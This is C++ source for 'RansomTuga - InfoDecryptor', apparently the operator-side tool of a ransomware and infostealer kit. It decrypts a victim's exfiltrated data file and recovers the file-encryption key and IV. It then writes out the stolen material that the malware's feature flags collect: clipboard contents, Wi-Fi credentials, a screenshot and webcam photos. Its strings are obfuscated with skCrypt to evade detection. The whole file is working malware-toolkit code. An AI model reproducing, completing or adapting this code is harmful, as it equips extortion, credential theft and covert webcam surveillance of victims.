#include "headers.h"

using namespace std;

string logo = (std::string)skCrypt(
    "  /$$$$$$            /$$$$$$          /$$$$$$$                                                      /$$\n"
    " |_  $$_/           /$$__  $$        | $$__  $$                                                    | $$\n"
    "   | $$   /$$$$$$$ | $$  \\__//$$$$$$ | $$  \\ $$  /$$$$$$   /$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$\n"
    "   | $$  | $$__  $$| $$$$   /$$__  $$| $$  | $$ /$$__  $$ /$$_____/ /$$__  $$| $$  | $$ /$$__  $$|_  $$_/   /$$__  $$ /$$__  $$\n"
    "   | $$  | $$  \\ $$| $$_/  | $$  \\ $$| $$  | $$| $$$$$$$$| $$      | $$  \\__/| $$  | $$| $$  \\ $$  | $$    | $$  \\ $$| $$  \\__/\n"
    "   | $$  | $$  | $$| $$    | $$  | $$| $$  | $$| $$_____/| $$      | $$      | $$  | $$| $$  | $$  | $$ /$$| $$  | $$| $$\n"
    "  /$$$$$$| $$  | $$| $$    |  $$$$$$/| $$$$$$$/|  $$$$$$$|  $$$$$$$| $$      |  $$$$$$$| $$$$$$$/  |  $$$$/|  $$$$$$/| $$\n"
    " |______/|__/  |__/|__/     \\______/ |_______/  \\_______/ \\_______/|__/       \\____  $$| $$____/    \\___/   \\______/ |__/\n"
    "                                                                              /$$  | $$| $$\n"
    "                                                                             |  $$$$$$/| $$\n"
    "                                                                              \\______/ |__/\n"
);

int main(int argc, char* argv[]) {
    system(skCrypt("title RansomTuga - InfoDecryptor"));
    HWND console = GetConsoleWindow();
    RECT r;
    GetWindowRect(console, &r);
    MoveWindow(console, r.left, r.top, 1060, 530, TRUE);

    cout << logo << skCrypt("\n\n\n");

    string fileName;
    cout << skCrypt(" Select crypted info-file: ");
    if (argc >= 2 && FileExists(argv[1]))
        fileName = argv[1];
    else
        fileName = OpenFilename();
    cout << fileName << endl;

    if (!FileExists(fileName)) {
        cout << skCrypt("\n File \"") << fileName << skCrypt("\" does not exists\n");
        Sleep(1500);
        exit(0);
    }

    string filePath = Split(fileName, '.')[0];
    if (!FileExists(filePath))
        system(((string)skCrypt("mkdir ") + filePath).c_str());


    string line;
    vector<string> content;
    ifstream inFile(fileName);
    while (getline(inFile, line))
        content.push_back(line);
    inFile.close();

    int contentIndex = 0;

    // info.txt
    bool founded = false;
    string contentDecryptedOnce = aes_decrypt(KEY, content[contentIndex++], IV);
    string contentDecryptedTwice;
    vector<string> dividedContentDecryptedOnce = Split(contentDecryptedOnce, ' ');
    for (int i = 0; i < dividedContentDecryptedOnce.size(); i++) {
        string part = dividedContentDecryptedOnce[i];
        if (founded) {
            vector<string> splittedAtNewLine = Split(part, '\n');

            string keyNIV = aes_decrypt(KEYOFKEY, Split(splittedAtNewLine[0], '\\')[0], IV) /*key*/ +
                (string)skCrypt("\\") + aes_decrypt(KEYOFKEY, Split(splittedAtNewLine[0], '\\')[1], IV) /*iv*/ +
                (string)skCrypt("\n");
            CopyToClipboard(keyNIV);
            contentDecryptedTwice += keyNIV;

            for (int j = 1; j < splittedAtNewLine.size(); j++) {
                contentDecryptedTwice += splittedAtNewLine[j];
                if (j != splittedAtNewLine.size() - 1)
                    contentDecryptedTwice += (string)skCrypt("\n");
            }

            if (i != dividedContentDecryptedOnce.size() - 1)
                contentDecryptedTwice += (string)skCrypt(" ");

            founded = false;
            continue;
        }
        if (part == string(skCrypt("Key:")) && !founded)
            founded = true;
        contentDecryptedTwice += part;
        if (i != dividedContentDecryptedOnce.size() - 1)
            contentDecryptedTwice += (string)skCrypt(" ");
    }

    string infoFileName = filePath + (string)skCrypt("\\info.txt");
    ofstream infoFile(infoFileName, ios::out | ios::binary);
    unsigned char smarker[] = { 0xEF, 0xBB, 0xBF };
    infoFile << smarker;
    infoFile.close();
    ofstream infoFile2(infoFileName, ios::out | ios::binary);
    infoFile2 << contentDecryptedTwice;
    infoFile2.close();

    cout << skCrypt(" File decrypted in \"") << infoFileName << skCrypt("\"\n");


    // cryptedFiles.txt
    string cryptFileName = filePath + (string)skCrypt("\\cryptedFiles.txt");
    ofstream cryptFile(cryptFileName, ios::out | ios::binary);
    cryptFile << smarker;
    cryptFile.close();
    ofstream cryptFile2(cryptFileName, ios::out | ios::binary);
    cryptFile2 << aes_decrypt(KEY, content[contentIndex++], IV);
    cryptFile2.close();
    cout << skCrypt(" File decrypted in \"") << cryptFileName << skCrypt("\"\n");


    // links.txt
#if FILE_UPLOADER
    string linksFileName = filePath + (string)skCrypt("\\links.txt");
    ofstream linksFile(linksFileName, ios::out | ios::binary);
    linksFile << smarker;
    linksFile.close();
    ofstream linksFile2(linksFileName, ios::out | ios::binary);
    linksFile2 << aes_decrypt(KEY, content[contentIndex], IV);
    linksFile2.close();
    cout << skCrypt(" File decrypted in \"") << linksFileName << skCrypt("\"\n");
#endif


    // clipboard.txt
    contentIndex += 1;
#if GET_CLIPBOARD
    string clipFileName = filePath + (string)skCrypt("\\clipboard.txt");
    ofstream clipFile(clipFileName, ios::out | ios::binary);
    clipFile << smarker;
    clipFile.close();
    ofstream clipFile2(clipFileName, ios::out | ios::binary);
    clipFile2 << aes_decrypt(KEY, content[contentIndex], IV);
    clipFile2.close();
    cout << skCrypt(" File decrypted in \"") << clipFileName << skCrypt("\"\n");
#endif


    // wifi.txt
    contentIndex += 1;
#if GET_WIFI
    string wifiFileName = filePath + (string)skCrypt("\\wifi.txt");
    ofstream wifiFile(wifiFileName, ios::out | ios::binary);
    wifiFile << smarker;
    wifiFile.close();
    ofstream wifiFile2(wifiFileName, ios::out | ios::binary);
    wifiFile2 << aes_decrypt(KEY, content[contentIndex], IV);
    wifiFile2.close();
    cout << skCrypt(" File decrypted in \"") << wifiFileName << skCrypt("\"\n");
#endif


    // screenshot.bmp
    contentIndex += 1;
#if GET_SCREENSHOT
    string screenFileName = filePath + (string)skCrypt("\\screenshot.bmp");
    ofstream screenFile(screenFileName, ios::out | ios::binary);
    vector<BYTE> screenshot = base64_decode(aes_decrypt(KEY, content[contentIndex], IV));
    screenFile.write((const char*)&screenshot[0], screenshot.size());
    screenFile.close();
    cout << skCrypt(" File decrypted in \"") << screenFileName << skCrypt("\"\n");
#endif


    // photos
    contentIndex += 1;
#if TAKE_WEBCAMS
    for (string file : Split(aes_decrypt(KEY, content[contentIndex], IV), '\n')) {
        vector<string> splitted = Split(file, ' ');
        if (splitted.size() < 1)
            break;
        string fileName = splitted[0];
        string fileData = splitted[1];
        if (base64_decode(fileData).size() <= 10)
            break;
        string webcamFileName = filePath + (string)skCrypt("\\webcam-") + fileName;
        ofstream webcamFile(webcamFileName, ios::out | ios::binary);
        vector<BYTE> webcam = base64_decode(fileData);
        webcamFile.write((const char*)&webcam[0], webcam.size());
        webcamFile.close();
        cout << skCrypt(" File decrypted in \"") << webcamFileName << skCrypt("\"\n");
    }
#endif
    

    cout << skCrypt("\n ");
    system(skCrypt("pause"));

    return 0;
}
